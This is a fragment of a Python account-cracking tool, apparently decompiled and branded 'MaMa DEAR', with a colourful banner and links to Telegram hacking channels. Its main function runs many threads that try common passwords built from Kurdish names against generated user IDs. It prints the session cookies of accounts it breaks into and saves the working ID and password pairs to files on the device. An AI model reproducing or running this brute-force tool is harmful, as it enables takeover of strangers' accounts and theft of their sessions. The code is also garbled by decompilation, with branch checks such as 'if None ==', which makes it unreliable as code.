...
def khld():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://t.me/Mama_Dear_Hack')
        return None
    if None == '3':
        os.system('xdg-open https://t.me/MaM_Deare_Chanal')
        return None
    if None == '4':
        os.system('xdg-open https://t.me/Shoping_MaMa_Dear')
    if None == '0':
        os.system('exit')
        return None
...
ha = current.day
today = date.today()
logo =                                          ("""  \x1b[1;91m______   _______  _______  \x1b[1;92m_______ 
\x1b[1;93m(  __  \ (  ____ \(  ___  )(  \x1b[1;94m____ )
\x1b[1;95m| (  \  )| (    \/| (   ) || (    )|
\x1b[1;96m| |   ) || (__    | (___) || (____)|
\x1b[1;97m| |   | ||  __)   |  ___  ||     __)
\x1b[1;91m| |   ) || (      | (   ) || (\ (   
\x1b[1;93m| (__/  )| (____/\| )   ( || ) \ \__
\x1b[1;94m(______/ (_______/|/     \||/   \__/
\x1b[1;91m>>    \x1b[1;94mBaxer Bet Bo Toole MaM Dear   \x1b[1;91m <<
\x1b[1;91m>>     \x1b[1;96mToole MaM Dear Version (1)   \x1b[1;91m <<
\033[;90m===============================================================
\033[1;33m[-] \x1b[1;91mCODBY     :\033[1;35m MaMa DEAR
\033[1;33m[-] \x1b[1;91mVERSION   :\033[1;35m UPDATE (1)
\033[1;33m[-] \x1b[1;91mCHANAL    :\033[1;35m Mama_Dear_Hack
\033[1;33m[-] \x1b[1;91mCHANAL    :\033[1;35m MaM_Deare_Chanal
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;93m')
        for love in user:
            pwx = [love,'kurd1234','kurd12345','kurd123456','hama1234','hama12345','zaxozaxo','zaxo1234','1234554321','zaxo12345','hama12','ahmad123','ahmad1234','KURD1234','KURD12345']
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[DEAR-OK] ' +uid+ ' | ' +ps+    '  \n\033[1;35m[√]\033[1;32mCOOKIE = \033[1;34m'+coki+  ' \n\033[1;36m[√] [AGENT] = \033[1;35m'+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/DEAR-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[DEAR-CP]  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/DEAR-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[DEAR] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
